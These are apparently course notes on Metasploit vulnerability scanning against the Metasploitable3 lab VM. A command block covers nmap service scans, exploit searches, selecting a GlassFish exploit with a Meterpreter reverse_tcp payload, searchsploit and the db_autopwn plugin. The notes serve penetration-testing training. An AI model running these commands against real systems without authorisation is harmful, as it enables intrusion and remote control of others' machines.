# i - Vulnerability Scanning with MSF

### **Vulnerability Scanning**

* Vulnerability scanning & detection is the process of scanning a target for vulnerabilities and verifying whether they can be exploited.
* So far, we have been able to identify and exploit misconfigurations on target systems, however, in this section we will be exploring the process of utilizing auxiliary and exploit modules to scan and identify inherent vulnerabilities in services, operating systems and web applications.
* This information will come in handy during the exploitation phase of this course.
* We will also be exploring the process of utilizing third party vulnerability scanning tools like Nessus and how we can integrate Nessus functionality in to the MSF.

### **Lab Environment**

* For the purposes of demonstrating the vulnerability scanning process, we will be utilizing an intentionally vulnerable virtual machine called Metasploitable3 that is based on Windows Server 2008.
* Metasploitable3 was developed by Rapid7 to demonstrate how MSF can be used to perform exploitable of a Windows System.
* Instructions on how this VM can be setup can be found here: [https://bit.ly/3kASwns](https://bit.ly/3kASwns)



## **Practical Demonstration**

```bash
systemctl start postgresql && msfconsole
# db_status
setg RHOSTS $ip

# create a workspace.
# the key thing you need for vuln scanning is the service version.
db_nmap -sS -sV -O $ip  # nmap scan for the service versions.

# how to identify vuln with the service versions?
# method 1
search type:exploit name: Microsoft IIS # fetches all MS IIS exploits. Dead-end in this case. Because the listed exploits dosen't match the service version on the victim OS.
search GlassFish
use 0
# we need to check if this exploit will work on the victim exploited service.
info # we get info as to all the service versions the exploit works for and (v4.0) is available.
set payload windows/meterpreter/reverse_tcp # we set the payload to windows 32bit reverse meterpreter session.
options

# method 2
# we can use searchsploit to search for vulns/exploits
searchsploit "<search>" #Search for exploits (available in MSF and others.
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit" #Search for exploits only available in MSF.

# method 3
# an automated but deprecated vulnerability/exploit scanner.
https://github.com/hahwul/metasploit-autopwn
# metasploit plugin for easy exploit & vulnerability attack.
# But, the db_autopwn command is removed from official distribution.
# download and Move dB_autopwn.rb file into metasploit plugin directory.
cp db_autopwn.rb /opt/metasploit-framework/plugins
msf5 > load db_autopwn # load the module into metasploit.
msf5 > db_autopwn # to load the help menu.
# it works when you already working with workspaces, and the services are already available (db_nmap scan).
db_autopwn -p -t # enumerate lots of exploits for each of the open ports, which is'nt specific to the servce version.
# we can streamline this by being specific.
db_autopwn -p -t -PI 445 # targeting only SMB.

# method 4
# Analyze your MSF database and return what services are vulnerable to MSF exploits. metho
msf6 > analyze #
msf6 > vulns # displays the found vulnerabilities.
```







